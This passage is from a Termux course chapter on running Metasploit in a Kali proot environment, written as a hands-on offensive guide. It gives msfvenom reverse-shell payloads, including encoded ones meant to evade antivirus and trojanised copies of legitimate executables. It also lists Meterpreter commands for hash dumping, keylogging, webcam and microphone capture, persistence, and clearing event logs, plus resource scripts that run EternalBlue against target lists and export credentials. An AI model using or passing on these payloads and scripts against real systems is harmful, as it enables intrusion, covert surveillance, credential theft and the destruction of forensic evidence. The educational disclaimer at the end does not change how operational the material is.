msfvenom -p osx/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f macho -o shell.macho

# Web Payloads
msfvenom -p php/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o shell.jsp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f asp -o shell.asp
msfvenom -p cmd/unix/reverse_bash LHOST=<ip> LPORT=<port> -f raw -o shell.sh

# Encoding
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -e x86/shikata_ga_nai -i 10 -f exe -o encoded.exe

# Multiple Encoding
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -e x86/shikata_ga_nai -i 5 -f exe | msfvenom -p - -e x86/countdown -i 5 -f exe -o double.exe

# Custom Options
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -a x86 --platform windows -f exe -o custom.exe
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -s <space> -b <badchars> -f exe -o custom.exe

# Embedded Payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -x original.exe -f exe -o infected.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -x original.exe -k -f exe -o injected.exe
```

### 6. Meterpreter Advanced Commands

```bash
# System Commands
sysinfo                        # System information
getuid                         # Current user
getpid                         # Process ID
getprivs                       # List privileges
ps                             # Process list
migrate <pid>                  # Migrate to process
execute -f <file> -i -H        # Execute file
shell                          # Drop to shell

# File System
pwd                            # Current directory
ls                             # List files
cd <path>                      # Change directory
cat <file>                     # Read file
edit <file>                    # Edit file
upload <local> <remote>        # Upload file
download <remote> <local>      # Download file
mkdir <dir>                    # Create directory
rm <file>                      # Delete file
rmdir <dir>                    # Delete directory
timestomp <file>               # Modify timestamps

# Network
ipconfig                       # Network interfaces
netstat                        # Network connections
route                          # Routing table
arp                            # ARP cache
getproxy                       # Proxy settings
portfwd list                   # List port forwards
portfwd add -l <local> -p <remote> -r <target>  # Add forward
portfwd delete -l <port>       # Delete forward

# Privilege Escalation
getsystem                      # Get SYSTEM
getprivs                       # Get privileges
run post/multi/recon/local_exploit_suggester  # Suggest exploits

# Credential Harvesting
hashdump                       # Dump hashes
run post/windows/gather/smart_hashdump
run post/windows/gather/credentials/credential_collector

# Keylogging
keyscan_start                  # Start keylogger
keyscan_dump                   # Dump keystrokes
keyscan_stop                   # Stop keylogger

# Screenshots
screenshot                     # Take screenshot
screenshare                    # Live screen share
record_mic                     # Record microphone

# Webcam
webcam_list                    # List webcams
webcam_snap                    # Take photo
webcam_stream                  # Live stream

# Persistence
run persistence -U -i <interval> -p <port> -r <ip>
run post/windows/manage/persistence

# Pivoting
run post/multi/manage/autoroute
run autoroute -s <subnet>
run autoroute -p

# Cleanup
clearev                        # Clear event logs
timestomp <file> -v            # View timestamps
close                          # Close session
exit                           # Exit Meterpreter
```

### 7. Post-Exploitation Module Categories

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    POST-EXPLOITATION MODULES                            │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  GATHER MODULES (Information Collection)                                │
│  ├── post/windows/gather/                                               │
│  │   ├── enum_system          # System enumeration                      │
│  │   ├── enum_applications    # Installed applications                  │
│  │   ├── enum_network         # Network configuration                   │
│  │   ├── enum_shares          # Shared folders                          │
│  │   ├── enum_services        # Running services                        │
│  │   ├── credentials/*        # Various credential harvesters          │
│  │   └── smart_hashdump       # Intelligent hash dumping               │
│  └── post/linux/gather/                                                │
│      ├── enum_system          # System enumeration                      │
│      └── checkcontainer      # Container detection                     │
│                                                                          │
│  ESCALATE MODULES (Privilege Escalation)                                │
│  ├── post/multi/recon/local_exploit_suggester                          │
│  ├── post/windows/escalate/droplink                                    │
│  └── post/windows/escalate/ask                                         │
│                                                                          │
│  MANAGE MODULES (System Management)                                     │
│  ├── post/windows/manage/                                              │
│  │   ├── persistence          # Install persistence                    │
│  │   ├── delete_user          # Delete user account                    │
│  │   ├── killav               # Kill antivirus                         │
│  │   └── enable_rdp           # Enable RDP                             │
│  └── post/multi/manage/                                                │
│      └── autoroute            # Setup routing                          │
│                                                                          │
│  CAPTURE MODULES (Data Capture)                                         │
│  ├── post/windows/capture/                                              │
│  │   ├── keylog_recorder      # Keyboard capture                       │
│  │   └── screen_capture       # Screenshot capture                     │
│  └── post/multi/capture/                                               │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### 8. Custom Module Template

```ruby
##
# Custom Metasploit Module Template
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Custom Exploit Module',
        'Description' => %q{
          This module exploits a vulnerability in XYZ application.
          Target versions: X.Y.Z and below.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Your Name <email@example.com>'  # Module author
        ],
        'References' => [
          ['CVE', '2024-XXXXX'],
          ['EDB', '12345'],
          ['URL', 'https://example.com/advisory']
        ],
        'Platform' => ['linux', 'windows'],
        'Arch' => [ARCH_X86, ARCH_X64],
        'Targets' => [
          [
            'Linux x64',
            {
              'Platform' => 'linux',
              'Arch' => ARCH_X64,
              'Payload' => { 'Space' => 4096 }
            }
          ],
          [
            'Windows x64',
            {
              'Platform' => 'windows',
              'Arch' => ARCH_X64,
              'Payload' => { 'Space' => 4096 }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2024-01-01',
        'DefaultOptions' => {
          'RPORT' => 8080,
          'SSL' => false
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => [REPEATABLE_SESSION]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'Base path', '/']),
        OptString.new('USERNAME', [false, 'Username for auth', '']),
        OptString.new('PASSWORD', [false, 'Password for auth', ''])
      ]
    )
  end

  def check
    # Check if target is vulnerable
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'version')
    )

    unless res
      return CheckCode::Unknown('Target did not respond')
    end

    # Version check logic
    if res.code == 200 && res.body.include?('v1.0')
      return CheckCode::Appears('Vulnerable version detected')
    end

    CheckCode::Safe('Target is not vulnerable')
  end

  def exploit
    print_status("Exploiting #{target.name}...")

    # Main exploit logic
    connect

    # Send payload
    sock.put(payload.encoded)

    # Handle session
    handler
    disconnect
  end

  def on_new_session(session)
    print_good("Session established!")
    super
  end
end
```

### 9. Resource Script Examples

```ruby
# == auto_exploit.rc ==
# Automated exploitation resource script

# Setup
setg LHOST 192.168.1.50
setg LPORT 4444
workspace -a assessment

# Import scan results
db_import /tmp/nmap_scan.xml

# Setup handler
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set ExitOnSession false
exploit -j

# Wait and execute
sleep 5

# Use exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS file:/tmp/targets.txt
exploit -j

# Monitor
sleep 30
sessions -l
```

```ruby
# == post_exploit.rc ==
# Post-exploitation automation

# Wait for session
sleep 10
sessions -l

# Interact with session 1
sessions -i 1 -c "sysinfo"
sessions -i 1 -c "getuid"

# Run post modules
use post/windows/gather/enum_system
set SESSION 1
run

use post/windows/gather/smart_hashdump
set SESSION 1
run

# Export results
creds -o /tmp/creds.txt
hosts -o /tmp/hosts.txt
loot -o /tmp/loot.txt
```

```ruby
# == setup.rc ==
# Initial Metasploit setup

# Database
db_connect
workspace -a project1

# Global settings
setg LHOST 192.168.1.50
setg LPORT 4444
setg ReverseAllowProxy true

# Logging
set ConsoleLogging true
set LogLevel 3

# Start handlers
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set ExitOnSession false
exploit -j

use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LPORT 5555
set ExitOnSession false
exploit -j

back
banner
```

### 10. Pivoting Configuration

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         PIVOTING SCENARIO                                │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│   ATTACKER                    DMZ                    INTERNAL           │
│   ┌────────┐               ┌────────┐              ┌────────┐          │
│   │  Kali  │ ──────────▶  │ Target │ ──────────▶  │Internal│          │
│   │192.168.│    Exploit    │10.0.0.5│   Pivot      │10.0.1.0│          │
│   │ 1.50   │               │        │              │  /24   │          │
│   └────────┘               └────────┘              └────────┘          │
│                                                                          │
│ PIVOTING STEPS:                                                          │
│                                                                          │
│ 1. Get initial shell on Target (10.0.0.5)                               │
│    use exploit/...                                                       │
│    set RHOSTS 10.0.0.5                                                   │
│    exploit                                                               │
│                                                                          │
│ 2. Setup autoroute through Meterpreter                                   │
│    meterpreter > run post/multi/manage/autoroute                        │
│                                                                          │
│ 3. Add route for internal network                                       │
│    meterpreter > run autoroute -s 10.0.1.0/24                           │
│                                                                          │
│ 4. Setup SOCKS proxy                                                    │
│    use auxiliary/server/socks_proxy                                     │
│    set SRVPORT 1080                                                      │
│    run                                                                   │
│                                                                          │
│ 5. Configure proxychains                                                │
│    echo "socks4 127.0.0.1 1080" >> /etc/proxychains4.conf               │
│                                                                          │
│ 6. Scan through pivot                                                   │
│    proxychains nmap -sT -Pn 10.0.1.0/24                                 │
│                                                                          │
│ 7. Attack internal targets                                              │
│    use exploit/...                                                       │
│    set RHOSTS 10.0.1.100                                                 │
│    set Proxies socks4:127.0.0.1:1080                                    │
│    exploit                                                               │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 📋 COMMANDS REFERENCE

### Proot-Distro Commands

```bash
# Installation
proot-distro install <distro>         # Install distribution
proot-distro install kali             # Install Kali Linux
proot-distro install ubuntu           # Install Ubuntu

# Management
proot-distro list                     # List available distros
proot-distro remove <distro>          # Remove distribution
proot-distro backup <distro>          # Backup distribution
proot-distro restore <distro>         # Restore from backup

# Login
proot-distro login <distro>           # Login to distro
proot-distro login kali               # Login to Kali
proot-distro login kali --shared-tmp  # With shared temp
proot-distro login kali --user root   # As root user

# Fix shebang
proot-distro fix-shebang <distro>     # Fix shebang scripts
```

### Metasploit Core Commands

```bash
# Console Commands
msfconsole                            # Start console
msfconsole -q                         # Quiet mode
msfconsole -r script.rc               # Run resource script
msfconsole -x "commands"              # Execute commands
msfconsole -L                         # Listen mode

# Database Commands
msfdb init                            # Initialize database
msfdb reinit                          # Reinitialize database
msfdb delete                          # Delete database
msfdb start                           # Start database
msfdb stop                            # Stop database

# Msfvenom Commands
msfvenom -p <payload> [options]       # Generate payload
msfvenom --list payloads              # List payloads
msfvenom --list encoders              # List encoders
msfvenom --list formats               # List formats
msfvenom -p <payload> --list-options  # Payload options
```

### 30+ Advanced Metasploit Commands

```bash
# 1-10: Database Operations
msf6 > db_status                      # Check database
msf6 > db_connect <url>               # Connect to DB
msf6 > db_import <file>               # Import scan
msf6 > db_export -f xml <file>        # Export database
msf6 > hosts                          # List hosts
msf6 > hosts -S <search>              # Search hosts
msf6 > services                       # List services
msf6 > services -p <port>             # Filter by port
msf6 > creds                          # List credentials
msf6 > creds add user:x pass:y        # Add credential

# 11-20: Workspace Operations
msf6 > workspace                      # List workspaces
msf6 > workspace -a <name>            # Add workspace
msf6 > workspace <name>               # Switch workspace
msf6 > workspace -d <name>            # Delete workspace
msf6 > workspace -r <old> <new>       # Rename workspace
msf6 > vulns                          # List vulnerabilities
msf6 > loot                           # List collected data
msf6 > notes                          # List notes
msf6 > notes -a <note>                # Add note
msf6 > analyze                        # Analyze data

# 21-30: Session Operations
msf6 > sessions -l                    # List sessions
msf6 > sessions -i <id>               # Interact
msf6 > sessions -k <id>               # Kill session
msf6 > sessions -K                    # Kill all
msf6 > sessions -v                    # Verbose list
msf6 > sessions -s <script>           # Run script
msf6 > jobs                           # List jobs
msf6 > jobs -k <id>                   # Kill job
msf6 > handler -H <ip> -P <port>      # Quick handler
msf6 > route                          # Show routes

# 31-40: Module Operations
msf6 > use <module>                   # Use module
msf6 > info                           # Module info
msf6 > show options                   # Show options
msf6 > show advanced                  # Advanced options
msf6 > show targets                   # Show targets
msf6 > set <option> <value>           # Set option
msf6 > setg <option> <value>          # Set global
msf6 > unset <option>                 # Unset option
msf6 > check                          # Check vulnerable
msf6 > exploit / run                  # Execute
```

---

## 💻 PRACTICE EXERCISES

### Exercise 1: Complete Kali Installation

```bash
# Task: Install Kali Linux in proot and verify setup

# Step 1: Install proot-distro
pkg install proot-distro -y

# Step 2: Install Kali
proot-distro install kali

# Step 3: Login and update
proot-distro login kali
sudo apt update && sudo apt upgrade -y

# Step 4: Install Metasploit
sudo apt install metasploit-framework -y

# Step 5: Verify installation
msfconsole --version
which msfvenom
which msfd

# Step 6: Test msfconsole
msfconsole -q -x "version; exit"

# Expected: Version output and successful exit
```

### Exercise 2: Database Setup

```bash
# Task: Setup PostgreSQL database for Metasploit

# Step 1: Start PostgreSQL
sudo service postgresql start

# Step 2: Initialize database
msfdb init

# Step 3: Start msfconsole and verify
msfconsole -q

# Step 4: Check database status
msf6 > db_status

# Step 5: Create workspace
msf6 > workspace -a lab_test

# Step 6: Add hosts manually
msf6 > hosts -a 192.168.1.100

# Step 7: Verify host added
msf6 > hosts

# Step 8: Export database
msf6 > db_export -f xml /tmp/db_backup.xml

# Expected: Database connected, workspace created, hosts visible
```

### Exercise 3: Payload Generation

```bash
# Task: Generate various payloads with msfvenom

# Step 1: List available payloads
msfvenom --list payloads | grep meterpreter

# Step 2: Generate Windows payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o windows_payload.exe

# Step 3: Generate Linux payload
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o linux_payload.elf

# Step 4: Generate encoded payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# Step 5: Check payload info
msfvenom -p windows/meterpreter/reverse_tcp --list-options

# Step 6: Generate stageless payload
msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o stageless.exe

# Step 7: Compare sizes
ls -la *.exe

# Expected: All payloads generated successfully
```

### Exercise 4: Handler Setup

```bash
# Task: Setup multi-handler for payloads

# Step 1: Start msfconsole
msfconsole -q

# Step 2: Use handler module
msf6 > use exploit/multi/handler

# Step 3: Set payload
msf6 exploit(handler) > set payload windows/meterpreter/reverse_tcp

# Step 4: Configure options
msf6 exploit(handler) > set LHOST 0.0.0.0
msf6 exploit(handler) > set LPORT 4444
msf6 exploit(handler) > set ExitOnSession false

# Step 5: Start handler
msf6 exploit(handler) > exploit -j

# Step 6: Check jobs
msf6 > jobs

# Step 7: Setup second handler
msf6 > handler -H 0.0.0.0 -P 5555 -p android/meterpreter/reverse_tcp

# Expected: Handlers running as jobs
```

### Exercise 5: Custom Module Creation

```bash
# Task: Create a simple custom Metasploit module

# Step 1: Create custom module directory
mkdir -p ~/.msf4/modules/exploits/custom

# Step 2: Create module file
cat > ~/.msf4/modules/exploits/custom/test_exploit.rb << 'EOF'
class MetasploitModule < Msf::Auxiliary
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Test Custom Module',
      'Description'    => 'A test module for learning',
      'Author'         => ['Student'],
      'License'        => MSF_LICENSE
    ))
  end

  def run
    print_status("Custom module executed successfully!")
    print_good("This is a test message")
    print_error("This is an error message")
  end
end
EOF

# Step 3: Reload modules in msfconsole
msfconsole -q
msf6 > reload_all

# Step 4: Use custom module
msf6 > use exploit/custom/test_exploit
msf6 auxiliary(...) > run

# Expected: Module runs and prints messages
```

### Exercise 6: Resource Script Automation

```bash
# Task: Create and run a resource script

# Step 1: Create resource script
cat > /tmp/auto_scan.rc << 'EOF'
# Auto scan resource script
workspace -a auto_scan_test
setg LHOST 192.168.1.50
setg LPORT 4444

# Setup handler
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set ExitOnSession false
exploit -j -z

# Go back
back

# Show status
workspace
jobs
EOF

# Step 2: Run resource script
msfconsole -q -r /tmp/auto_scan.rc

# Step 3: Verify
msf6 > workspace
msf6 > jobs

# Expected: Workspace created, handler running
```

---

## ⚠️ TROUBLESHOOTING

### Problem 1: Proot Installation Fails

```bash
# Symptom: "Failed to install distribution"

# Solution 1: Check internet connection
ping -c 3 google.com

# Solution 2: Update proot-distro
pkg update && pkg upgrade proot-distro -y

# Solution 3: Clear cache and retry
rm -rf ~/.proot-distro
proot-distro install kali

# Solution 4: Check storage space
df -h
# Need at least 3GB free

# Solution 5: Use alternative mirror
export PROOT_DISTRO_MIRROR=https://mirrors.edge.kernel.org/kali/
proot-distro install kali
```

### Problem 2: Metasploit Database Connection Error

```bash
# Symptom: "Failed to connect to database"

# Solution 1: Start PostgreSQL manually
sudo service postgresql start

# Solution 2: Check PostgreSQL status
sudo service postgresql status

# Solution 3: Reinitialize database
msfdb delete
msfdb init

# Solution 4: Check database.yml
cat ~/.msf4/database.yml

# Solution 5: Manual database setup
sudo -u postgres createuser msf -P
sudo -u postgres createdb -O msf msf
db_connect msf:password@localhost/msf
```

### Problem 3: Msfconsole Slow/Lagging

```bash
# Symptom: Msfconsole takes too long to start

# Solution 1: Disable banner
msfconsole -q

# Solution 2: Increase memory (if possible)
# Close other apps

# Solution 3: Use quiet mode
msfconsole -q -x "commands; exit"

# Solution 4: Clear database
msfdb reinit

# Solution 5: Check system resources
top
free -h
```

### Problem 4: Payload Generation Fails

```bash
# Symptom: "Error generating payload"

# Solution 1: Check payload exists
msfvenom --list payloads | grep <payload_name>

# Solution 2: Check syntax
msfvenom -p windows/meterpreter/reverse_tcp --list-options

# Solution 3: Use correct format
msfvenom --list formats

# Solution 4: Check architecture
msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 --platform windows

# Solution 5: Install missing dependencies
sudo apt install mingw-w64 -y
```

### Problem 5: Session Dies Immediately

```bash
# Symptom: Meterpreter session closes immediately

# Solution 1: Use stageless payload
msfvenom -p windows/meterpreter_reverse_tcp LHOST=x LPORT=y -f exe

# Solution 2: Check firewall
# Disable firewall or allow port

# Solution 3: Use different port
set LPORT 80  # Common port

# Solution 4: Enable reverse connections
set ReverseListenerBindAddress 0.0.0.0

# Solution 5: Use HTTP payload
set payload windows/meterpreter/reverse_http
```

### Problem 6: VNC/Armitage Not Working

```bash
# Symptom: VNC connection fails

# Solution 1: Start VNC properly
vncserver :1 -geometry 1280x720

# Solution 2: Check VNC running
vncserver -list

# Solution 3: Set VNC password
vncpasswd

# Solution 4: Kill and restart
vncserver -kill :1
vncserver :1

# Solution 5: Check display
export DISPLAY=:1
armitage

# Solution 6: Check ports
netstat -tlnp | grep 59
```

### Problem 7: Custom Module Not Loading

```bash
# Symptom: Custom module not found

# Solution 1: Check file extension
# Must be .rb

# Solution 2: Check directory structure
ls ~/.msf4/modules/exploits/custom/

# Solution 3: Reload all modules
msf6 > reload_all

# Solution 4: Check Ruby syntax
ruby -c ~/.msf4/modules/exploits/custom/mymodule.rb

# Solution 5: Check module path
msf6 > show all | grep custom
```

### Problem 8: PostgreSQL Won't Start

```bash
# Symptom: "postgresql: unrecognized service"

# Solution 1: Install PostgreSQL
sudo apt install postgresql -y

# Solution 2: Initialize cluster
sudo pg_ctlcluster 14 main start

# Solution 3: Check cluster
pg_lsclusters

# Solution 4: Create cluster if missing
sudo pg_createcluster 14 main --start

# Solution 5: Check logs
tail -f /var/log/postgresql/*.log
```

---

## 🎬 VIDEO ASSETS

### Thumbnail Concepts

**Option A: Proot + Metasploit**
```
┌────────────────────────────────────┐
│  [Kali Linux Logo] [Metasploit]    │
│                                    │
│   METASPLOIT IN PROOT              │
│   Full Kali Linux Setup            │
│                                    │
│   ✓ Database Support               │
│   ✓ Armitage GUI                   │
│   ✓ Custom Modules                 │
│                                    │
│   [T3rmuxk1ng]                     │
└────────────────────────────────────┘
```

**Option B: Feature Focus**
```
┌────────────────────────────────────┐
│  💀 KALI LINUX IN TERMUX! 💀       │
│                                    │
│   ┌──────────────────────────┐     │
│   │   FULL METASPLOIT        │     │
│   │   DATABASE + GUI         │     │
│   │   CUSTOM MODULES         │     │
│   └──────────────────────────┘     │
│                                    │
│   Chapter 50 | T3rmuxk1ng          │
└────────────────────────────────────┘
```

**Option C: Comparison Style**
```
┌────────────────────────────────────┐
│  ❌ Without Proot  │  ✅ With Proot │
│  ─────────────────┼────────────────│
│  No Database      │  Full DB       │
│  Broken Modules   │  All Working   │
│  No GUI           │  Armitage GUI  │
│                                    │
│  🔥 COMPLETE SETUP GUIDE 🔥        │
│  [T3rmuxk1ng]                      │
└────────────────────────────────────┘
```

### Video Description Template

```markdown
💀 Metasploit in Proot | Full Kali Linux Setup in Termux | Chapter 50

🔥 In this complete guide you'll learn:
• Kali Linux installation in proot-distro
• Full Metasploit Framework setup
• PostgreSQL database configuration
• Msfconsole advanced features
• Msfvenom complete payload generation
• Armitage GUI with VNC
• Creating custom Metasploit modules
• Meterpreter advanced techniques
• Pivoting and routing through targets
• Post-exploitation modules
• Resource scripts and automation
• Integration with other security tools
• Logging and reporting

⏱️ Timestamps:
0:00 - Introduction
1:00 - Why Proot for Metasploit
3:00 - Prerequisites Check
4:30 - Installing Kali Linux in Proot
10:00 - Metasploit Installation in Kali
15:00 - Database Setup
18:00 - Msfconsole Advanced Features
22:00 - Msfvenom Complete Guide
26:00 - Armitage GUI with VNC
30:00 - Creating Custom Modules
34:00 - Meterpreter Deep Dive
38:00 - Pivoting and Routing
42:00 - Post-Exploitation Modules
45:00 - Resource Scripts & Automation
48:00 - Integration with Other Tools
51:00 - Logging and Reporting
54:00 - Summary & Best Practices

📥 Important Links:
• Kali Linux: https://kali.org
• Metasploit: https://metasploit.com
• Proot-Distro: https://github.com/termux/proot-distro

📝 Commands Reference:
All commands available in video description and course materials!

📚 Full Course Playlist:
[PLAYLIST LINK]

📱 Follow T3rmuxk1ng:
• YouTube: @T3rmuxk1ng
• Telegram: [LINK]
• GitHub: [LINK]

#Metasploit #KaliLinux #Termux #T3rmuxk1ng #Proot #EthicalHacking #PenetrationTesting #CyberSecurity #Meterpreter #Msfvenom

---
⚠️ Disclaimer: This video is for educational purposes only. Use these tools responsibly and only on systems you have explicit permission to test. Unauthorized access to computer systems is illegal.
```

### Tags List

```
metasploit, metasploit framework, kali linux, termux, proot, 
proot-distro, msfconsole, msfvenom, meterpreter, armitage,
ethical hacking, penetration testing, cybersecurity, 
termux hacking, kali linux in termux, metasploit in termux,
android hacking, mobile hacking, termux tutorial,
t3rmuxk1ng, termux course, metasploit tutorial,
payload generation, reverse shell, exploit development,
post exploitation, pivoting, custom modules,
hindi tutorial, termux hindi, hacking course
```

### Hashtags

```
#Metasploit #KaliLinux #Termux #Proot #EthicalHacking 
#PenetrationTesting #CyberSecurity #Msfconsole #Msfvenom
#Meterpreter #Armitage #AndroidHacking #TermuxHindi 
#T3rmuxk1ng #LearnHacking #InfoSec #BugBounty
```

---

## 📚 ADDITIONAL RESOURCES

### Official Documentation

| Resource | Link |
|----------|------|
| Metasploit Wiki | https://docs.metasploit.com/ |
| Rapid7 Docs | https://www.rapid7.com/products/metasploit/ |
| Kali Documentation | https://www.kali.org/docs/ |
| Proot-Distro GitHub | https://github.com/termux/proot-distro |

### Learning Resources

| Resource | Description |
|----------|-------------|
| Metasploit Unleashed | Free course by Offensive Security |
| Rapid7 University | Free training resources |
| Penetration Testing Execution Standard | PTES methodology |
| Metasploit Framework GitHub | Source code and examples |

### Community Resources

| Platform | Purpose |
|----------|---------|
| r/metasploit | Reddit community |
| Metasploit Help | Google Group |
| Rapid7 Community | Official forums |
| #metasploit | IRC on Libera.Chat |

---

## ✅ CHAPTER CHECKLIST

Before moving to next chapter, verify:

- [ ] Kali Linux installed successfully in proot
- [ ] Can login to Kali with `proot-distro login kali`
- [ ] Metasploit Framework installed
- [ ] `msfconsole --version` shows version
- [ ] PostgreSQL database configured
- [ ] `db_status` shows connected
- [ ] Can generate payloads with msfvenom
- [ ] Handler working for catching sessions
- [ ] Understand basic Meterpreter commands
- [ ] Created at least one resource script
- [ ] Understand pivoting concept
- [ ] Can create custom modules

---

## 🎯 NEXT CHAPTER PREVIEW

**Chapter 51: Password Generator Project**

- Build a complete password generator tool
- Multiple generation modes
- Entropy calculation
- Password strength checker
- GUI with dialog
- Export functionality

---

**Chapter Complete! 🎉**

*Created by T3rmuxk1ng | Termux Full Course*
